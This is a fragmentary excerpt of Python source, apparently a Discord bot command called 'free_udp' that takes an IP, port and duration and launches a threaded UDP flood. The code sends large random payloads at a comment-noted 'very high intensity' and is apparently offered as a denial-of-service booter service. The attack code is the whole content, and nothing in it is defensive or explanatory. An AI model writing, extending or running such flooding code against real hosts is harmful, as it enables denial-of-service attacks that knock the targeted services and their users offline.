...
def udp_attack(ip, port, duration, stop_event):
    ...
    payloads = [
        ...
        random._urandom(1460),
        random._urandom(1500),
    ]
    while time.time() < timeout and not stop_event.is_set():
        try:
            for _ in range(300):  # Intensidad muy alta por ciclo
...
async def free_udp(ctx, ip: str = None, port: int = None, duration: int = None):
    ...
    thread = threading.Thread(target=udp_attack, args=(ip, port, duration, stop_event))
    thread.start()
